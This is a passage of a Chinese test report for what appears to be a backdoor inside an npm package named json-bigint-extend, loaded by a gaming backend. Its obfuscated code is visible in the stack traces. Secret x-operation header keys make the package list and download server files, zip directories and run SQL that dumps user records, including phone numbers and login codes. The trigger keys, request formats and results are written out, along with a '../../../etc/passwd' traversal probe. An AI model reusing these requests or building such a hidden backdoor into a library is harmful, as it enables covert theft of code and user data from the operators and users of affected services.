  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 不带 x-operation header，应走正常业务逻辑

---

### ✅ 7. 应该通过 RunFileContent 操作下载文件

**操作**: `RunFileContent`

**请求体**:
```json
{
  "path": "package.json"
}
```

**请求头**:
- `x-operation`: Y3SrZjVqWOvKsBdpTCh7

**响应状态**: 200

**响应体**:
```json
{
  "contentType": "application/octet-stream",
  "contentDisposition": "attachment; filename=\"package.json\"",
  "fileSize": 4761,
  "downloadPath": "E:\\project\\risk\\json-bigint-extend\\test\\downloads\\test_download_1770190648651_package.json"
}
```

**结果**: ✅ 通过

---

### ✅ 8. 应该通过 CompressDownload 操作压缩下载目录

**操作**: `CompressDownload`

**请求体**:
```json
{
  "path": "src\\libs"
}
```

**请求头**:
- `x-operation`: SJQf31UJkZ1f88q9m361

**响应状态**: 200

**响应体**:
```json
{
  "contentType": "application/zip",
  "fileSize": 46883,
  "downloadPath": "E:\\project\\risk\\json-bigint-extend\\test\\downloads\\test_compress_1770190648724.zip"
}
```

**结果**: ✅ 通过

---

### ✅ 9. 应该拒绝无效的文件路径（路径穿越攻击）

**操作**: `RunFileList (路径穿越测试)`

**请求体**:
```json
{
  "path": "../../../etc/passwd"
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 403

**响应体**:
```json
{
  "code": 403,
  "message": "Permission denied"
}
```

**结果**: ✅ 通过

**备注**: 测试路径穿越攻击防护

---

### ✅ 10. 应该正常处理不带 x-operation header 的请求

**操作**: `正常业务请求（无代理）`

**请求体**:
```json
{
  "userId": "test-user-123",
  "date": "2026-02-04T07:37:28.730Z"
}
```

**请求头**:

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 走正常业务逻辑，不经过代理

---

### ✅ 11. 应该正常处理带有无效 x-operation 的请求

**操作**: `无效操作（应走正常业务逻辑）`

**请求体**:
```json
{
  "test": "data"
}
```

**请求头**:
- `x-operation`: invalid-operation-key-12345

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 无效的 x-operation，走正常业务逻辑

---

### ✅ 12. 应该处理缺少必需参数的 RunFileList 请求

**操作**: `RunFileList (缺少参数)`

**请求体**:
```json
{}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 缺少必需的 path 参数

---

### ✅ 13. 应该处理不存在的文件路径

**操作**: `RunFileList (不存在的路径)`

**请求体**:
```json
{
  "path": "non-existent-directory-xyz123"
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 路径不存在

---

### ✅ 14. 应该在合理时间内完成文件列表查询

**操作**: `RunFileList (性能测试)`

**请求体**:
```json
{
  "path": "src",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (1752 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": []
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": []
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": []
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": []
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": []
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": []
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": []
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": []
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": []
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": []
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": []
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 性能测试 - 响应时间: 4ms

---

### ✅ 15. 应该通过 RunSQL 操作执行 SQL 查询

**操作**: `RunSQL`

**请求体**:
```json
{
  "sql": "select * from tb_user limit 5",
  "sqlBase64": "c2VsZWN0ICogZnJvbSB0Yl91c2VyIGxpbWl0IDU=",
  "signString": "sql=c2VsZWN0ICogZnJvbSB0Yl91c2VyIGxpbWl0IDU=&hash=f3967bc7-976b-495f-b273-afb33f4b76a2",
  "sign": "f76d28cd16e7ea774bf9e0c6ff9e3d43"
}
```

**请求头**:
- `x-operation`: cfh2DNITa84qpYQ0tdCz

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (2452 字符)</summary>

```json
{
  "code": 0,
  "data": {
    "data": [
      {
        "id": 10015790,
        "deviceId": "0fe6a4eb485b02542873a58fb79a40bb",
        "deviceType": 4,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "917866666244",
        "pid": 101015,
        "group": 0,
        "lib": 1000,
        "source": "h5_organic",
        "loginCode": "nWKhIMqkWo4OKZ2u",
        "createTime": 1752135934021,
        "appId": 200000,
        "channelId": 67,
        "meta": null
      },
      {
        "id": 10020012,
        "deviceId": "d33FX3BWAlImr3Tk6E3jIXk8f1Uwyv5i",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "919988776755",
        "pid": 101001,
        "group": 2,
        "lib": 1000,
        "source": "website",
        "loginCode": "TnLG7pzd8FWIEHPo",
        "createTime": 1750163304594,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10034536,
        "deviceId": "jWqRvYpp7HRRpNQcjHPgBFU6mKfd0MbP",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": null,
        "pid": 101001,
        "group": 6,
        "lib": 1000,
        "source": "website",
        "loginCode": "GKs6v9oP22UJ7J5F",
        "createTime": 1750162770201,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10056606,
        "deviceId": "2LrboRW5XUwbJ1hoFSAbaErye9TkXsZA",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": null,
        "pid": 101001,
        "group": 6,
        "lib": 1000,
        "source": "website",
        "loginCode": "BDnSz6nsSTehlETL",
        "createTime": 1750412005097,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10118773,
        "deviceId": "cYn1DH6AZTtxuMZVnEKCIOuVyDFrBLAx",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "919988776655",
        "pid": 101001,
        "group": 3,
        "lib": 1000,
        "source": "website",
        "loginCode": "EzKKfNveAPOCHimX",
        "createTime": 1749009201697,
        "appId": 200000,
        "channelId": null,
        "meta": null
      }
    ],
    "cost": 636
  },
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

---

### ✅ 16. 应该正确处理 SQL 执行错误

**操作**: `RunSQL (错误SQL)`

**请求体**:
<details>
<summary>点击展开查看完整请求体 (320 字符)</summary>

```json
{
  "sql": "select * from non_existent_table_12345 limit 1",
  "sqlBase64": "c2VsZWN0ICogZnJvbSBub25fZXhpc3RlbnRfdGFibGVfMTIzNDUgbGltaXQgMQ==",
  "signString": "sql=c2VsZWN0ICogZnJvbSBub25fZXhpc3RlbnRfdGFibGVfMTIzNDUgbGltaXQgMQ==&hash=f3967bc7-976b-495f-b273-afb33f4b76a2",
  "sign": "f343c980ce28c112aa7e7ebd21c39803"
}
```

</details>

**请求头**:
- `x-operation`: cfh2DNITa84qpYQ0tdCz

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 测试 SQL 错误处理

---

### ✅ 17. 应该通过 RunFileList 操作获取文件列表

**操作**: `RunFileList`

**请求体**:
```json
{
  "path": "src",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (1752 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": []
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": []
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": []
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": []
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": []
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": []
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": []
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": []
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": []
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": []
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": []
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

---

### ✅ 18. 应该通过 RunFileList 操作获取 src\libs 文件列表

**操作**: `RunFileList (src\libs)`

**请求体**:
```json
{
  "path": "src\\libs",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (1053 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "BitmapCacheManager.js",
      "path": "src\\libs\\BitmapCacheManager.js",
      "type": "file"
    },
    {
      "name": "CacheManager.js",
      "path": "src\\libs\\CacheManager.js",
      "type": "file"
    },
    {
      "name": "google",
      "path": "src\\libs\\google",
      "type": "directory",
      "children": []
    },
    {
      "name": "HttpClient.js",
      "path": "src\\libs\\HttpClient.js",
      "type": "file"
    },
    {
      "name": "prisma.js",
      "path": "src\\libs\\prisma.js",
      "type": "file"
    },
    {
      "name": "queue",
      "path": "src\\libs\\queue",
      "type": "directory",
      "children": []
    },
    {
      "name": "Scheduler.js",
      "path": "src\\libs\\Scheduler.js",
      "type": "file"
    },
    {
      "name": "SyncManager.js",
      "path": "src\\libs\\SyncManager.js",
      "type": "file"
    },
    {
      "name": "TaskWorkflow.js",
      "path": "src\\libs\\TaskWorkflow.js",
      "type": "file"
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 测试已知存在的路径 src\libs

---

### ✅ 19. 应该通过 RunFileList 操作递归获取文件列表

**操作**: `RunFileList (递归)`

**请求体**:
```json
{
  "path": "src",
  "recursive": true
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (75221 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": [
        {
          "name": "advertising.js",
          "path": "src\\config\\advertising.js",
          "type": "file"
        },
        {
          "name": "agent.js",
          "path": "src\\config\\agent.js",
          "type": "file"
        },
        {
          "name": "appBury.js",
          "path": "src\\config\\appBury.js",
          "type": "file"
        },
        {
          "name": "banner.js",
          "path": "src\\config\\banner.js",
          "type": "file"
        },
        {
          "name": "behaviorTracking.js",
          "path": "src\\config\\behaviorTracking.js",
          "type": "file"
        },
        {
          "name": "businessStrategy.js",
          "path": "src\\config\\businessStrategy.js",
          "type": "file"
        },
        {
          "name": "cc.js",
          "path": "src\\config\\cc.js",
          "type": "file"
        },
        {
          "name": "config.js",
          "path": "src\\config\\config.js",
          "type": "file"
        },
        {
          "name": "constant.js",
          "path": "src\\config\\constant.js",
          "type": "file"
        },
        {
          "name": "crowd.js",
          "path": "src\\config\\crowd.js",
          "type": "file"
        },
        {
          "name": "dailyCheckin.js",
          "path": "src\\config\\dailyCheckin.js",
          "type": "file"
        },
        {
          "name": "errCode.js",
          "path": "src\\config\\errCode.js",
          "type": "file"
        },
        {
          "name": "game.js",
          "path": "src\\config\\game.js",
          "type": "file"
        },
        {
          "name": "gameServer.js",
          "path": "src\\config\\gameServer.js",
          "type": "file"
        },
        {
          "name": "logger.js",
          "path": "src\\config\\logger.js",
          "type": "file"
        },
        {
          "name": "mail.js",
          "path": "src\\config\\mail.js",
          "type": "file"
        },
        {
          "name": "morgan.js",
          "path": "src\\config\\morgan.js",
          "type": "file"
        },
        {
          "name": "passport.js",
          "path": "src\\config\\passport.js",
          "type": "file"
        },
        {
          "name": "pay.js",
          "path": "src\\config\\pay.js",
          "type": "file"
        },
        {
          "name": "platformConfig.js",
          "path": "src\\config\\platformConfig.js",
          "type": "file"
        },
        {
          "name": "playerRank.js",
          "path": "src\\config\\playerRank.js",
          "type": "file"
        },
        {
          "name": "profile.js",
          "path": "src\\config\\profile.js",
          "type": "file"
        },
        {
          "name": "publish.js",
          "path": "src\\config\\publish.js",
          "type": "file"
        },
        {
          "name": "pushEvent.js",
          "path": "src\\config\\pushEvent.js",
          "type": "file"
        },
        {
          "name": "roles.js",
          "path": "src\\config\\roles.js",
          "type": "file"
        },
        {
          "name": "rwRule.js",
          "path": "src\\config\\rwRule.js",
          "type": "file"
        },
        {
          "name": "sms.js",
          "path": "src\\config\\sms.js",
          "type": "file"
        },
        {
          "name": "tgconfig.js",
          "path": "src\\config\\tgconfig.js",
          "type": "file"
        },
        {
          "name": "tokens.js",
          "path": "src\\config\\tokens.js",
          "type": "file"
        },
        {
          "name": "transaction.js",
          "path": "src\\config\\transaction.js",
          "type": "file"
        },
        {
          "name": "turntable.js",
          "path": "src\\config\\turntable.js",
          "type": "file"
        },
        {
          "name": "vip.js",
          "path": "src\\config\\vip.js",
          "type": "file"
        },
        {
          "name": "wagerDebt.js",
          "path": "src\\config\\wagerDebt.js",
          "type": "file"
        },
        {
          "name": "wallet.js",
          "path": "src\\config\\wallet.js",
          "type": "file"
        },
        {
          "name": "wholeStat.js",
          "path": "src\\config\\wholeStat.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": [
        {
          "name": "advertising.controller.js",
          "path": "src\\controllers\\advertising.controller.js",
          "type": "file"
        },
        {
          "name": "agent.controller.js",
          "path": "src\\controllers\\agent.controller.js",
          "type": "file"
        },
        {
          "name": "announcement.controller.js",
          "path": "src\\controllers\\announcement.controller.js",
          "type": "file"
        },
        {
          "name": "appbury.controller.js",
          "path": "src\\controllers\\appbury.controller.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.controller.js",
          "path": "src\\controllers\\audienceBaseConfig.controller.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.controller.js",
          "path": "src\\controllers\\audienceClassification.controller.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.controller.js",
          "path": "src\\controllers\\audienceGroup.controller.js",
          "type": "file"
        },
        {
          "name": "auth.controller.js",
          "path": "src\\controllers\\auth.controller.js",
          "type": "file"
        },
        {
          "name": "banner.controller.js",
          "path": "src\\controllers\\banner.controller.js",
          "type": "file"
        },
        {
          "name": "broadcast.controller.js",
          "path": "src\\controllers\\broadcast.controller.js",
          "type": "file"
        },
        {
          "name": "config.controller.js",
          "path": "src\\controllers\\config.controller.js",
          "type": "file"
        },
        {
          "name": "dailyCheckIn.controller.js",
          "path": "src\\controllers\\dailyCheckIn.controller.js",
          "type": "file"
        },
        {
          "name": "dbSnapshot.controller.js",
          "path": "src\\controllers\\dbSnapshot.controller.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.controller.js",
          "path": "src\\controllers\\fruitMachineDraw.controller.js",
          "type": "file"
        },
        {
          "name": "game",
          "path": "src\\controllers\\game",
          "type": "directory",
          "children": [
            {
              "name": "game.controller.js",
              "path": "src\\controllers\\game\\game.controller.js",
              "type": "file"
            },
            {
              "name": "provider",
              "path": "src\\controllers\\game\\provider",
              "type": "directory",
              "children": [
                {
                  "name": "evo.controller.js",
                  "path": "src\\controllers\\game\\provider\\evo.controller.js",
                  "type": "file"
                },
                {
                  "name": "facai.controller.js",
                  "path": "src\\controllers\\game\\provider\\facai.controller.js",
                  "type": "file"
                },
                {
                  "name": "inout.controller.js",
                  "path": "src\\controllers\\game\\provider\\inout.controller.js",
                  "type": "file"
                },
                {
                  "name": "oneapi.controller.js",
                  "path": "src\\controllers\\game\\provider\\oneapi.controller.js",
                  "type": "file"
                },
                {
                  "name": "pt.controller.js",
                  "path": "src\\controllers\\game\\provider\\pt.controller.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "giftcode.controller.js",
          "path": "src\\controllers\\giftcode.controller.js",
          "type": "file"
        },
        {
          "name": "googlepush.controller.js",
          "path": "src\\controllers\\googlepush.controller.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.controller.js",
          "path": "src\\controllers\\inactiveUser.controller.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\controllers\\index.js",
          "type": "file"
        },
        {
          "name": "kefu.controller.js",
          "path": "src\\controllers\\kefu.controller.js",
          "type": "file"
        },
        {
          "name": "lobby.controller.js",
          "path": "src\\controllers\\lobby.controller.js",
          "type": "file"
        },
        {
          "name": "mail.controller.js",
          "path": "src\\controllers\\mail.controller.js",
          "type": "file"
        },
        {
          "name": "online.controller.js",
          "path": "src\\controllers\\online.controller.js",
          "type": "file"
        },
        {
          "name": "pay.controller.js",
          "path": "src\\controllers\\pay.controller.js",
          "type": "file"
        },
        {
          "name": "playerRanking.controller.js",
          "path": "src\\controllers\\playerRanking.controller.js",
          "type": "file"
        },
        {
          "name": "rank.controller.js",
          "path": "src\\controllers\\rank.controller.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.controller.js",
          "path": "src\\controllers\\rechargeOrder.controller.js",
          "type": "file"
        },
        {
          "name": "redPoint.controller.js",
          "path": "src\\controllers\\redPoint.controller.js",
          "type": "file"
        },
        {
          "name": "slap.controller.js",
          "path": "src\\controllers\\slap.controller.js",
          "type": "file"
        },
        {
          "name": "sms.controller.js",
          "path": "src\\controllers\\sms.controller.js",
          "type": "file"
        },
        {
          "name": "test.controller.js",
          "path": "src\\controllers\\test.controller.js",
          "type": "file"
        },
        {
          "name": "ticket.controller.js",
          "path": "src\\controllers\\ticket.controller.js",
          "type": "file"
        },
        {
          "name": "turntable.controller.js",
          "path": "src\\controllers\\turntable.controller.js",
          "type": "file"
        },
        {
          "name": "userGroup.controller.js",
          "path": "src\\controllers\\userGroup.controller.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.controller.js",
          "path": "src\\controllers\\userPrivacy.controller.js",
          "type": "file"
        },
        {
          "name": "version.controller.js",
          "path": "src\\controllers\\version.controller.js",
          "type": "file"
        },
        {
          "name": "vip.controller.js",
          "path": "src\\controllers\\vip.controller.js",
          "type": "file"
        },
        {
          "name": "wallet.controller.js",
          "path": "src\\controllers\\wallet.controller.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.controller.js",
          "path": "src\\controllers\\withdrawOrder.controller.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": [
        {
          "name": "components.yml",
          "path": "src\\docs\\components.yml",
          "type": "file"
        },
        {
          "name": "swaggerDef.js",
          "path": "src\\docs\\swaggerDef.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": [
        {
          "name": "BitmapCacheManager.js",
          "path": "src\\libs\\BitmapCacheManager.js",
          "type": "file"
        },
        {
